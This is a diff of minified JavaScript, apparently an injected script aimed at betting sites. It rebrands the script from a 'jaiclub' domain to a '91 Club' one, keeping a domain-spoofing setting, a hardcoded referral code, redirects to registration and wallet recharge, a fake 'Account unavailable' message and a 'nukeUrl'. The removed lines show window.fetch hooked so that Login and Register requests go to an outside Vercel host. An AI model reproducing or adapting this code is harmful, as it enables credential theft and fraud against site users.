@@ -24,8 +24,8 @@ function Wt({
         });
     });
     let c = window.fetch,
-        p = "https://vercel-edge-ruddy-gamma.vercel.app",
-        w = /\/api\/webapi\/(Register|Login)$/,
+        p = "",
+        w = /$^/,
         S = '{"code":1,"msg":"' + i + '"}',
         M = "";
     function q(g, C) {
@@ -2346,7 +2346,7 @@ function me() {
 }
 function Po() {
     if (k) return;
-    let n = "jaiclub09.com".includes("okwin"),
+    let n = "cqz6091.com".includes("okwin"),
         t = document.createElement("style");
     ((t.textContent = `
     .wgp-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.75);z-index:99998;display:none}
@@ -3751,13 +3751,13 @@ var D = {
 var vn,
     Yn = 0;
 sessionStorage.setItem("invitecode", "58745105516");
-var Yo = "https://api.jaiclubapi.com",
+var Yo = "https://91clubapi.com",
     Vo = "Account unavailable. Please create a new account.",
     Ko = "/#/register?invitationCode=58745105516",
     Do = "/#/wallet/Recharge",
-    Bo = "jaiclub09.com".includes("okwin") ? "light" : "dark",
-    Ao = "jaiclub09.com".includes("okwin") ? "OKWIN" : "JAIWIN",
-    so = "jaiclub09.com".includes("okwin") ? "ok888.win" : "jaiclub.win",
+    Bo = "cqz6091.com".includes("okwin") ? "light" : "dark",
+    Ao = "cqz6091.com".includes("okwin") ? "OKWIN" : "91 Club",
+    so = "cqz6091.com".includes("okwin") ? "ok888.win" : "91club07.in",
     De = "";
 function _(n) {
     let t = String(n == null ? "" : n).trim();
@@ -3896,7 +3896,7 @@ function se() {
 }
 Wt({
     apiBase: Yo,
-    spoofDomain: "jaiclub09.com",
+    spoofDomain: "cqz6091.com",
     minBalance: 500,
     nukeUrl: Ko,
     authErrMsg: Vo,
